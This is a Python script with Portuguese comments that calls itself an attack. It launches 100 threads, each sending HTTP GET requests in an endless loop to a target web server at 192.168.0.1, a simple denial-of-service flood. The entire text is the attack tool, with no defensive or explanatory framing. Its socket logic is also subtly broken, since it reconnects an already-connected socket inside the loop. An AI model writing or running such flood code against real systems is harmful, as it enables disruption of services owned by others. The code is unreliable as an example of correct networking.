import socket
import threading

# Endereço IP e porta do alvo
target_host = "192.168.0.1"
target_port = 80

# Função que envia solicitações continuamente
def atacar():
    # Criando um socket
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Ficando em loop para enviar solicitações continuamente
    while True:
        # Tentando conectar ao alvo
        client.connect((target_host, target_port))

        # Enviando uma solicitação HTTP "GET" ao alvo
        request = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_host)
        client.send(request.encode())

# Criando várias threads para atacar o alvo de forma simultânea
for i in range(100):
    t = threading.Thread(target=atacar)
    t.start()
